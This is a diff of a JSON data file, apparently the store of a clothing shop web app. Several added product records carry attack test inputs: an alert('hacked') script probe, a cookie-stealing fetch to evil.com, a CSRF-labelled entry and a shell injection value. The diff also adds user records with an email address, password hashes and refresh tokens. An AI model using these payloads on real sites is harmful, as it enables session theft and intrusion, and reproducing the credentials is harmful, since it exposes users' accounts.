@@ -2687,6 +2687,174 @@
       "hidden": false,
       "date": 1782730868900,
       "bestseller": false
+    },
+    {
+      "_id": "c4e8e",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873172185,
+      "bestseller": false
+    },
+    {
+      "_id": "806ea",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873180237,
+      "bestseller": false
+    },
+    {
+      "_id": "a5f7e",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873226210,
+      "bestseller": false
+    },
+    {
+      "_id": "f86c3",
+      "name": "INJECTED",
+      "description": "alert(\"hacked\")",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873227069,
+      "bestseller": false
+    },
+    {
+      "_id": "70a2d",
+      "name": "fetch(\"https://evil.com/steal?cookie=\"+document.cookie)",
+      "description": "",
+      "price": 50,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873255252,
+      "bestseller": false
+    },
+    {
+      "_id": "944cc",
+      "name": "CSRF Product",
+      "description": "",
+      "price": 999,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873399398,
+      "bestseller": false
+    },
+    {
+      "_id": "e08e7",
+      "name": "'; ls -la /;'",
+      "description": "",
+      "price": 100,
+      "image": [],
+      "category": "Men",
+      "subCategory": "Topwear",
+      "sizes": [
+        "S",
+        "M",
+        "L",
+        "XL"
+      ],
+      "stock": {
+        "S": 0,
+        "M": 0,
+        "L": 0,
+        "XL": 0
+      },
+      "hidden": false,
+      "date": 1782873538482,
+      "bestseller": false
     }
   ],
   "users": [
@@ -2892,9 +3060,37 @@
       "email": "test_450661913@test.com",
       "password": "$2a$10$aVpNWSMvAybgel0VeCXm5el4U0BVmGBfN25DEr6Rzq/hWxc4ZZoxy",
       "role": "user"
+    },
+    {
+      "id": "82b738e2-1667-49dc-ba0b-ceeff7e58b34",
+      "name": "Chiếnd",
+      "email": "chien1802032@gmail.com",
+      "password": "$2a$10$sZ6W7gziEEc9uHRYsTxAMulPBeIFdccOrIr8Iw8TgLXbJdarE7z22",
+      "role": "user"
+    },
+    {
+      "id": "ba24f851-e7c4-478f-b7a3-305a1c4e1d91",
+      "name": "testuser1212",
+      "email": "test@test1212.com",
+      "password": "$2a$10$R8mjfHxUpURj7fit3uB8g.hnwl5wcyg0CcZbduO2VYmSt9Jvm213a",
+      "role": "user"
     }
   ],
-  "carts": [],
+  "carts": [
+    {
+      "userId": "82b738e2-1667-49dc-ba0b-ceeff7e58b34",
+      "items": [
+        {
+          "productId": "aaaab",
+          "name": "Men Round Neck Pure Cotton T-shirt",
+          "price": 200,
+          "image": "/src/assets/p_img2_1.png",
+          "size": "L",
+          "quantity": 6
+        }
+      ]
+    }
+  ],
   "orders": [],
   "refreshTokens": [
     {
@@ -2916,6 +3112,21 @@
       "token": "a47df3814b26a8e2f78d3c0168832c0036400164533c4a434f39660ca3b9c249b5f606d04ccab971",
       "userId": "d3967b51-99b8-4561-91ac-e202eba0c900",
       "expiresAt": 1783426813401
+    },
+    {
+      "token": "e04ca61a5c0736b9aaec0d8d6d94dc54ae89d393aef7e772d94ab137904a4802d80b57dcc3b2b410",
+      "userId": "82b738e2-1667-49dc-ba0b-ceeff7e58b34",
+      "expiresAt": 1783477937545
+    },
+    {
+      "token": "5858ba3b0ddb72ab7e14f9f1b30ff69a0ef598fba33e9fab40eb7d7ee1ce053a6ba4c346392c2d43",
+      "userId": "ba24f851-e7c4-478f-b7a3-305a1c4e1d91",
+      "expiresAt": 1783477953687
+    },
+    {
+      "token": "4bcfc4ac7f647b7ecd028563014f7b121b78298f272311ee27e85a000fb2a47a5551625564124f1b",
+      "userId": "1",
+      "expiresAt": 1783477959851
     }
   ]
 }
